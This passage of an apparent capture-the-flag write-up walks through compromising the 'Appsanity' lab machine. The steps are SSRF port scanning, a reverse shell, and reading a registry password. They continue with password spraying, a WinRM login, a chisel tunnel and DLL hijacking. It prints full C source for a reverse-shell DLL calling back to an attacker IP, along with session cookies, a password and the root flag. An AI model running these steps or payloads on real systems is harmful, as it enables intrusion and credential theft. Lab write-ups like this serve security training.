Request:

```
POST /Prescriptions/SendEmail HTTP/2
Host: portal.meddigi.htb
Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImJvYnJvc3MyQHRlc3QuY29tIiwibmJmIjoxNzEwMzM4MDM3LCJleHAiOjE3MTAzNDE2MzcsImlhdCI6MTcxMDMzODAzNywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.A70tACamRLr63_noxzHLPhnfQbpbHDuZsVHWDqKRy5k; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8IUXuESuvU5Cu4DV0yvQkJeBOkkaFuoa1mQ8CCVbncM605gDrQiFq5X0oeviOc5wTScQkW9nJryMZz5-pIBbSiAcBzVZBoq4HTpIyjvUuzsSspSNo45pFtT5-e1aEU_EWdlCBR9WcbrHZHFJX8zw-cM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portal.meddigi.htb/Prescriptions
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: https://portal.meddigi.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

Email=test%40test.com&Link=http%3A%2F%2F10.10.14.47%2Fssrf
```

Response: 

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ python3 -m http.server 80                                                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.238 - - [13/Mar/2024 09:57:35] code 404, message File not found
10.10.11.238 - - [13/Mar/2024 09:57:35] "GET /ssrf HTTP/1.1" 404 -
```

# Enumerating Local Ports via SSRF 
Now to use the SSRF vulnerability to enumerate local ports and services on the system. `ffuf` was used in addition with a request intercepted with burpsuite. A common web ports wordlist was used.

There seems to be something running on port 8080 due to the difference in time and size.

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ ffuf -request ssrf.req -w topwebports.txt -t 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://portal.meddigi.htb/Prescriptions/SendEmail
 :: Wordlist         : FUZZ: /home/kali/htb/appsanity/topwebports.txt
 :: Header           : Host: portal.meddigi.htb
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Sec-Fetch-Dest: empty
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Origin: https://portal.meddigi.htb
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Te: trailers
 :: Header           : Accept: */*
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Referer: https://portal.meddigi.htb/Prescriptions
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Sec-Fetch-Mode: cors
 :: Header           : Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImJvYnJvc3MyQHRlc3QuY29tIiwibmJmIjoxNzEwMzM4MDM3LCJleHAiOjE3MTAzNDE2MzcsImlhdCI6MTcxMDMzODAzNywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.A70tACamRLr63_noxzHLPhnfQbpbHDuZsVHWDqKRy5k; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8IUXuESuvU5Cu4DV0yvQkJeBOkkaFuoa1mQ8CCVbncM605gDrQiFq5X0oeviOc5wTScQkW9nJryMZz5-pIBbSiAcBzVZBoq4HTpIyjvUuzsSspSNo45pFtT5-e1aEU_EWdlCBR9WcbrHZHFJX8zw-cM
 :: Data             : Email=test%40test.com&Link=http%3A%2F%2F127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 5
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

443                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
8080                    [Status: 200, Size: 2060, Words: 688, Lines: 54, Duration: 140ms]
8000                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2074ms]
3000                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2076ms]
5000                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2085ms]
```

# Inspecting port 8080 via SSRF
Using the SSRF it was possible to view what is being hosted on internal port 8080. It appears to be a web service hosting the reports uploaded in the previous step. Now the location of the report uploads is known it should be possible to access the ASPX shell via SSRF and get code execution to obtain a reverse shell.

![9eaf0407837037b71e885db7cea59dc0.png](/assets/img/9eaf0407837037b71e885db7cea59dc0.png)

The below screenshot is an example of the full command used to gain RCE. The full link of the report was copied and slightly modified. HTTPS needed changed to HTTP and the public IP needed replaced with 127.0.0.1. 

![59635b5cd7ead97ff06354a22342dcb9.png](/assets/img/59635b5cd7ead97ff06354a22342dcb9.png)

It worked. Below is the output of the returned request. Reverse shell obtained.

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ nc -lvnp 9001              
listening on [any] 9001 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.238] 52828
Spawn Shell...
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```

# Enumerating Windows
No interesting privileges or groups. There are some interesting directories on the file system. There is a PanelExamination directory within the IIS directory. No obvious configuration files that contain database credentials. It does have a bin folder with some custom DLL's which stand out.

```
c:\windows\system32\inetsrv>whoami
whoami
appsanity\svc_exampanel

c:\windows\system32\inetsrv>net user
net user

User accounts for \\APPSANITY

-------------------------------------------------------------------------------
Administrator            DefaultAccount           devdoc                   
Guest                    svc_exampanel            svc_meddigi              
svc_meddigiportal        WDAGUtilityAccount       
The command completed successfully.


c:\windows\system32\inetsrv>whoami /all
whoami /all

USER INFORMATION
----------------

User Name               SID                                           
======================= ==============================================
appsanity\svc_exampanel S-1-5-21-4111732528-4035850170-1619654654-1007


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                            Attributes                                        
====================================== ================ ============================================================== ==================================================
Everyone                               Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                   Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                        Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\ExamPanel                  Well-known group S-1-5-82-2916625395-3930688606-393764215-2099654449-2832396995 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeAuditPrivilege              Generate security audits             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

# Inspecting ExaminationPanel Web Service

Copying the interesting DLL's to my local system to review them further.

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ sudo impacket-smbserver -smb2support share $(pwd)
[sudo] password for kali: 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

```
c:\inetpub\ExaminationPanel\ExaminationPanel\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F854-971D

 Directory of c:\inetpub\ExaminationPanel\ExaminationPanel\bin

09/26/2023  07:30 AM    <DIR>          .
09/26/2023  07:30 AM    <DIR>          ..
09/24/2023  08:46 AM         4,991,352 EntityFramework.dll
09/24/2023  08:46 AM           591,752 EntityFramework.SqlServer.dll
09/24/2023  08:46 AM            13,824 ExaminationManagement.dll
09/24/2023  08:46 AM            40,168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
09/24/2023  08:49 AM    <DIR>          roslyn
09/24/2023  08:46 AM           431,792 System.Data.SQLite.dll
09/24/2023  08:46 AM           206,512 System.Data.SQLite.EF6.dll
09/24/2023  08:46 AM           206,520 System.Data.SQLite.Linq.dll
09/24/2023  08:49 AM    <DIR>          x64
09/24/2023  08:49 AM    <DIR>          x86
               7 File(s)      6,481,920 bytes
               5 Dir(s)   3,964,137,472 bytes free

c:\inetpub\ExaminationPanel\ExaminationPanel\bin>xcopy *.dll \\10.10.14.47\share
xcopy *.dll \\10.10.14.47\share
C:EntityFramework.dll
C:EntityFramework.SqlServer.dll
C:ExaminationManagement.dll
C:Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
C:System.Data.SQLite.dll
C:System.Data.SQLite.EF6.dll
C:System.Data.SQLite.Linq.dll
7 File(s) copied

c:\inetpub\ExaminationPanel\ExaminationPanel\bin>

```

# Reversing DLL
Copying the DLL's over to a Windows machine and reversing them with `dnspy` revealed the below function. It seems to be obtaining the password via a registry value `Software\MedDigi\EncKey`. 

```c#
        // Token: 0x0600001E RID: 30 RVA: 0x00002884 File Offset: 0x00000A84
        private string RetrieveEncryptionKeyFromRegistry()
        {
            string text;
            try
            {
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
                {
                    if (registryKey == null)
                    {
                        ErrorLogger.LogError("Registry Key Not Found");
                        base.Response.Redirect("Error.aspx?message=error+occurred");
                        text = null;
                    }
                    else
                    {
                        object value = registryKey.GetValue("EncKey");
                        if (value == null)
                        {
                            ErrorLogger.LogError("Encryption Key Not Found in Registry");
                            base.Response.Redirect("Error.aspx?message=error+occurred");
                            text = null;
                        }
                        else
                        {
                            text = value.ToString();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                ErrorLogger.LogError("Error Retrieving Encryption Key", ex);
                base.Response.Redirect("Error.aspx?message=error+occurred");
                text = null;
            }
            return text;
```

# Reading Registry Value

Using the reverse shell it was possible to query the registry value as shown below. It revealed a password.

```
c:\inetpub\ExaminationPanel\ExaminationPanel\bin>reg query HKLM\Software\MedDigi 
reg query HKLM\Software\MedDigi

HKEY_LOCAL_MACHINE\Software\MedDigi
    EncKey    REG_SZ    1g0tTh3R3m3dy!!
```

# Password Spraying

I tried to use crackmapexec to password spray and it failed for unknown reasons. Installing netexec and using that resolved the issue. Below is the output of the password spray. It showed the password matched for the `devdoc` user.

```
┌──(kali㉿kali)-[~/.local/bin]
└─$ ./netexec winrm meddigi.htb -u ~/htb/appsanity/users.txt -p '1g0tTh3R3m3dy!!'
WINRM       10.10.11.238    5985   APPSANITY        [*] Windows 10 / Server 2019 Build 19041 (name:APPSANITY) (domain:Appsanity)
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\administrator:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\svc_meddigiportal:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\svc_exampanel:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\svc_meddigi:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [+] Appsanity\devdoc:1g0tTh3R3m3dy!! (Pwn3d!)
```

# Logging in as devdoc via WinRM
It was possible to login as `devdoc` using evil-winrm as shown below. 

```
┌──(kali㉿kali)-[~/.local/bin]
└─$ evil-winrm -i meddigi.htb -u devdoc -p '1g0tTh3R3m3dy!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\devdoc\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
appsanity\devdoc S-1-5-21-4111732528-4035850170-1619654654-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

# ReportManagement Executable

In program files there is a folder titled Report Manager which contains executables. These executables are non-standard and stand out. 

I attempted to copy all the executables in the directory to my machine to review them. The `devdoc` user only had access to `ReportManagement.exe`.

```
*Evil-WinRM* PS C:\program files\reportmanagement> dir


    Directory: C:\program files\reportmanagement


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/13/2024   3:44 AM                Libraries
-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
-a----         9/17/2023   3:54 AM         140512 profapi.dll
-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
-a----          5/5/2023   5:21 AM         179248 wldp.dll


*Evil-WinRM* PS C:\program files\reportmanagement> xcopy *.exe \\10.10.14.47\share
```

# Reversing ReportManagement.exe

Running strings against the executable revealed a number of interesting strings. It seems the executable is listening for incoming network connections and allows certain commands to be issued. There are also some interesting directories listed such as `C:\Program Files\ReportManagement\Libraries`, `C:\Users\Administrator\Backup` and `C:\inetpub\ExaminationPanel\ExaminationPanel\Reports`. 

```
C:\inetpub\ExaminationPanel\ExaminationPanel\Reports
C:\Users\Administrator\Backup
reportmanagement_log.txt
Failed to receive data from client.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
backup
Backup operation completed successfully.
An error occurred during the backup operation.
upload
Invalid command. Missing parameter after 'upload'. Type 'help' for available commands.
C:\Program Files\ReportManagement\Libraries
.dll
externalupload
Failed to upload to external source.
Attempting to upload to external source.
Invalid command. Type 'help' for available commands.
An error occurred while processing the upload command.
validate
.hash
  :  
 (Hash mismatch)
Altered file found: 
 (Hash file not found)
Validation completed.
Validation completed. All reports are intact.
An error occurred during the validation operation.
Validation failed
recover
Invalid command. Missing filename after 'recover'. Type 'help' for available commands.
File successfully recovered from backup.
The file appears to be tampered with and cannot be recovered.
Specified file not found in the backup directory.
Failed to initialize Winsock.
Failed to create socket.
Failed to bind socket.
Failed to accept incoming connection.
Reports Management administrative console. Type "help" to view available commands.

```

# Finding the Port

WinPEAS enumeration was used to collect data. As seen below ReportManagement is running on TCP port 100. 

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               100           0.0.0.0               0               Listening         5600            ReportManagement
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         908             svchost
  TCP        0.0.0.0               443           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5888            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         696             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         536             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1048            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1604            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         676             services
  TCP        10.10.11.238          139           0.0.0.0               0               Listening         4               System

```

# Tunneling to interact with port 100

Chisel was used to open a tunnel to port 100 as shown below.

Reverse server:

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ ./chiselserver_linux server -reverse -p 9005
2024/03/13 14:34:48 server: Reverse tunnelling enabled
2024/03/13 14:34:48 server: Fingerprint Zst5WSSNu6UbCNSZDKEpiYX34F8kLEhvcCMFhlZuM+k=
2024/03/13 14:34:48 server: Listening on http://0.0.0.0:9005
2024/03/13 14:36:57 server: session#1: Client version (1.9.1) differs from server version (1.7.6)
2024/03/13 14:36:57 server: session#1: tun: proxy#R:8100=>100: Listening
```

Connecting to server from client:

```
*Evil-WinRM* PS C:\Users\devdoc> .\chisel.exe client 10.10.14.47:9005 R:8100:127.0.0.1:100
```

Testing the connection:

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ nc localhost 8100          
Reports Management administrative console. Type "help" to view available commands.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
```

# Hijacking DLL call
The `ReportManager.exe` appears to be attempting to load a DLL called "externalupload.dll" when the upload function is used. It expects the DLL to be located within the `C:\program files\reportmanagement\libraries` directory.

# Compiling Malicious DLL

Source: https://github.com/Hood3dRob1n/Y.A.S.P./blob/master/payloads/reverse-dll/reverse_dll.c

```c
/* Windows Reverse Shell                           
Tested under windows 7 with AVG Free Edition.
Author: FuRt3x
blkhtc0rp@yahoo.com.br                                  
Compile: wine gcc.exe windows.c -o windows.exe -lws2_32 
*/                                                      

#define REVERSEIP "10.10.14.47"
#define REVERSEPORT 9010

#include <winsock2.h>
#include <stdio.h>   

#pragma comment(lib,"ws2_32")

  WSADATA wsaData;
  SOCKET Winsock; 
  SOCKET Sock;    
  struct sockaddr_in hax;
                         
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{                               
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
                                                                                                                                                                                                   
    hax.sin_family = AF_INET;                                                                     
    hax.sin_port =  htons(REVERSEPORT);
    hax.sin_addr.s_addr = inet_addr(REVERSEIP);                                                     

    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);        
    ini_processo.dwFlags=STARTF_USESTDHANDLES;   
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
                                                                                                
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info);      
    return TRUE;
}
```

Compiling instructions:

```bash
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ x86_64-w64-mingw32-gcc reverse_dll.c -shared -lws2_32 -o externalupload.dll 
```

# Uploading Malicious DLL
Uploading the DLL containing the reverse shell to the `C:\program files\reportmanagement\libraries` directory.

```
*Evil-WinRM* PS C:\program files\reportmanagement\libraries> upload externalupload.dll
                                        
Info: Uploading /home/kali/htb/appsanity/externalupload.dll to C:\program files\reportmanagement\libraries\externalupload.dll
                                        
Data: 118508 bytes of 118508 bytes copied
                                        
Info: Upload successful!
```

# Executing Payload
Connecting to port 100 and sending the upload command which should trigger a call to load the `externalupload.dll`. When the DLL is loaded it should execute the reverse shell and establish a connection.

```
──(kali㉿kali)-[~/htb/appsanity]
└─$ nc localhost 10000
Reports Management administrative console. Type "help" to view available commands.
upload preview.pdf
```

It worked. Connection returned as the administrator user. Root flag captured.

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ nc -lvnp 9010
listening on [any] 9010 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.238] 64899
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\ReportManagement>whoami
whoami
appsanity\administrator

c:\Users\Administrator\Desktop>type root.txt
type root.txt
93a683998b615dfcbb2ab06470999f88

c:\Users\Administrator\Desktop>

```